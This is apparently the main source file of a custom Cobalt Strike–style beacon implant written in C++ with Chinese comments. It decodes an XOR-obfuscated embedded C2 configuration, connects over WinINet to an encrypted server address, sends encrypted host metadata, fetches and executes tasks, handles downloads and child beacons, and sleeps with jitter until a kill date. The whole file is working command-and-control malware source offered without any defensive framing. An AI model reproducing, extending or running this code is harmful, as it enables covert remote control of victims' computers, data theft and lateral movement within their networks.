
#include <iostream>

#include "Utils.h"
#include "Global.h"
#include "rotation.h"
#include "encrypt_decrypt.h"
#include "common.h"
#include "comm.h"
#include "BeaconTask.h"
#include "BeaconLateralMovement.h"
#include "ChildBeacon.h"
#include "BeaconSleep.h"
//#include "c2profile.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Wininet.lib")
#ifdef _WIN64

#pragma comment(lib,"tomcryptx64.lib")
#pragma comment(lib,"tommathx64.lib")
#else

#pragma comment(lib,"tomcrypt.lib")
#pragma comment(lib,"tommath.lib")
#endif // _WIN64

//去c2profile
//控制指令重写
//强

void Beacon_init(HINSTANCE dllbase)
{
	Beacon_Dllbase = dllbase;
	//分配c2配置信息内存块
	CsC2Config = (char*)malloc(CsC2Config_size);
	memset(CsC2Config, 0, CsC2Config_size);
	

	//解密内嵌的配置信息
	for (int i = 0; i < 0x1000; ++i)
	{
		rawData[i] ^= 0x2Eu;
	}

	datap c2profile;
	//指向c2profile 4096堆指针及大小信息
	BeaconDataParse(&c2profile, (char*)rawData, 4096);
	for (int index = BeaconDataShort(&c2profile); ; index = BeaconDataShort(&c2profile))
	{
		if (index <= 0)
		{
			break;
		}
		WORD data_type = BeaconDataShort(&c2profile);
		WORD data_size = BeaconDataShort(&c2profile);
		int size = index_size * index;

		*(WORD*)(CsC2Config + size) = data_type;
		switch (data_type)
		{
		case 1:
			*(WORD*)(CsC2Config + size + sizeof(size_t)) = BeaconDataShort(&c2profile);
			break;
		case 2:
			*(DWORD*)(CsC2Config + size + sizeof(size_t)) = BeaconDataInt(&c2profile);
			break;
		case 3:
			//分配一块内存存放str 
			*(ULONG_PTR*)(CsC2Config + size + sizeof(size_t)) = (ULONG_PTR)malloc(data_size);
			void* data = BeaconDataPtr(&c2profile, data_size);
			//取出刚才分配的内存地址开始复制数据
			memcpy(*(ULONG_PTR**)(CsC2Config + size + sizeof(size_t)), data, data_size);
			break;
		}
	}
	memset(rawData, 0, sizeof(rawData));
	return;
}

void wintinit(LPCSTR lpszServerName, INTERNET_PORT ServerPort, LPCSTR lpszAgent){
    HINTERNET hInternet;
    HINTERNET hConnect;
    int lpBuffer = 240000;
    g_dwFlags = (decryptInt(shark_flaghttpopen) & 8) != 8 ? 0x84480200 : 0x84C03200;
    char* ProxyStrBuffer = decryptString(shark_ProxyStrBuffer);
    hInternet = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    g_hInternet = hInternet;
    InternetSetOptionA(g_hInternet, INTERNET_OPTION_SEND_TIMEOUT, &lpBuffer, 4u);
    InternetSetOptionA(g_hInternet, INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT, &lpBuffer, 4u);
    hConnect = InternetConnectA(g_hInternet, lpszServerName, ServerPort, 0, 0, INTERNET_SERVICE_HTTP, 0, g_dwContext);
    g_hConnect = hConnect;
}

int beacon_stop_date()
{
	struct _SYSTEMTIME SystemTime;

	 // killdate
	if (!decryptInt(shark_kill_data))
	{
		return decryptInt(shark_kill_data);
	}
	GetLocalTime(&SystemTime);
	return SystemTime.wDay + 100 * (SystemTime.wMonth + 100 * (unsigned int)SystemTime.wYear) >= decryptInt(shark_kill_data);
}

int Beacon_exit()
{

	if (decryptInt(shark_exitflag) == 1)
	{
		if (decryptInt(shark_CreateBackgroundThreads) == 1)
		{
			while (1)
			{
				Sleep(0x3E8);
			}
		}
		ExitThread(0);
	}
	if (decryptInt(shark_CreateBackgroundThreads) != 1)
	{
		ExitProcess(0);
	}
	HANDLE threadhandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ExitProcess, 0, 0, 0);
	return WaitForSingleObject(threadhandle, 0xFFFFFFFF);
}

void shark_init(){

    shark_ServerPostUrl.value = shark_path[rand()%shark_paths_size];

}


int main(int argc,char const *argv[])
{
    initGlobleVar();
    //shark_init();
	//Beacon_init(NULL);
	datap* parser = BeaconDataInit(0x280);

    char* http_get_url = BeaconDataPtr(parser, 256);
	BeaconDataPtr(parser, 256);

	char* ServerHost_buffer = (char*)BeaconDataPtr(parser, 128);

	char* ServerIP = decryptString(shark_serverip);
	int ServerPort = decryptInt(shark_ServerPort);
    //http文件头
	char* lpszAgent = decryptString(shark_lpszAgent);
	char* ServerPostUrl = decryptString(shark_ServerPostUrl);

	g_dwMilliseconds = decryptInt(shark_dwMilliseconds);
	g_jitter = decryptInt(shark_jitter);

	int conne_error = 0;


	//初始化轮询相关
	//rotationstruc* rotation_opt = (rotationstruc*)malloc(sizeof(rotationstruc));

	//69 和failover(错误切换)有关 纯failover模式 69等于0
	//当是按照错误次数切换的时候69等于指定次数
	int failover_Strategy_number = decryptInt(shark_failover_Strategy_number);

	//70也与failover有关当是按照时间切换的时候70等于指定的时间
	int failover_Strategy_time = decryptInt(shark_failover_Strategy_time);

	//68 如果是rotate模式 跟切换时间有关
	int rotate_Strategy_time = decryptInt(shark_rotate_Strategy_time);

	//67 是模式id 
	//2表示rotate或failover
	//如果是random则是1 随机模式
	//如果是round-robin则是0 默认模式
	int strategyID = decryptInt(shark_strategyID);                       // 67 68 69 70和轮询模式相关


	// 
	//69 与错误切换有关默认-1非错误切换 单错误切换等于0 
	//如果是-x表示根据次数切换 69等于相应的次数
	//init_rotation(rotation_opt, strategyID, rotate_Strategy_time, failover_Strategy_time, failover_Strategy_number);


	/*if (beacon_stop_date())
	{
		Beacon_exit();
	}*/

	int server_output_size = 1114112; //.http-get.server.output
	char* server_output_buffer = (char*)malloc(server_output_size);
	Generate_encryption_metadata(server_output_buffer, server_output_size);// 构造元数据并加密




    while (g_dwMilliseconds)
	{

		//host 获取 轮询取出host
		//char* p_ServerHost = beacon_Rotation_Strategy(rotation_opt, ServerIP, conne_error);
		_snprintf(ServerHost_buffer, 0x80, "%s", ServerIP);


		conne_error = 0;

        char* string_getpath = decryptString(shark_ServerGetUrl);
        int getpathsize = decryptInt(shark_geturllength);
        int postpathsize = decryptInt(shark_posturllength);

        int jishu = 0;
        int ssget = rand()%getpathsize;
        while (1) {
            if (jishu==ssget)
            {
                break;
            }
            int size = strlen(string_getpath);
            string_getpath = (string_getpath + size + 1);
            jishu++;
        }
		char* p_ServerUrl = string_getpath;
		_snprintf(http_get_url, 0x80, "%s", p_ServerUrl);


		g_BeaconStart = 1;

        char* string_postpath = decryptString(shark_ServerPostUrl);
        int jishup = 0;
        int sspost = rand()%postpathsize;
        while (1) {
            if (jishup==sspost)
            {
                break;
            }
            int size = strlen(string_postpath);
            string_postpath = (string_postpath + size + 1);
            jishup++;
        }
        ServerPostUrl = string_postpath;
		_snprintf(g_post_url, 0x100u, "%s", ServerPostUrl);

        wintinit(ServerHost_buffer, ServerPort, lpszAgent);
		//set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);// 设置一些http选项



		int server_out_size = call_send_Metadata(http_get_url, server_output_buffer, server_output_size);
		if (server_out_size > 0)
		{
			int taskdata_size = decrypt_output_data(server_output_buffer, server_out_size);// 解密
			server_out_size = taskdata_size;

			if (taskdata_size > 0)//有任务
			{
				Parse_Task((BeaconTask*)server_output_buffer, taskdata_size);// 对解密后的任务进行执行
			}
		}

		if (server_out_size == -1)
		{
			//连接失败
			conne_error = 1;
		}
		else
		{
			sub_1000715A();

			if (decryptInt(shark_shouldChunkPosts))
			{
				CheckDownload(4096);                     // 文件下载相关
			}
			else
			{
				CheckDownload(0x80000);
			}
			CheckChildBeacon();
			CheckJobOutput();
			if (beacon_stop_date())		// 判断是否有结束运行日期
			{
				Beacon_end();//结束
			}
			if (g_withdatasize > 0)
			{
				close_http_Handle();
                wintinit(ServerHost_buffer, ServerPort, lpszAgent);
				//set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);
				sned_beacon_data(gBeaconOutputData);
			}
		}
		close_http_Handle();
		if (beacon_stop_date())
		{
			Beacon_exit();
		}
		if (!g_dwMilliseconds)
		{
			break;
		}
		if (g_jitter)
		{
			int temp = g_dwMilliseconds * g_jitter / 0x64;
			temp = temp ? random_int() % temp : 0;
			int dwMilliseconds = g_dwMilliseconds;
			if (temp < g_dwMilliseconds)
			{
				dwMilliseconds = g_dwMilliseconds - temp;
			}
			BeaconSleep(dwMilliseconds);
		}
		else
		{
			BeaconSleep(g_dwMilliseconds);
		}
	}
	//free(rotation_opt);
	return Beacon_exit();
}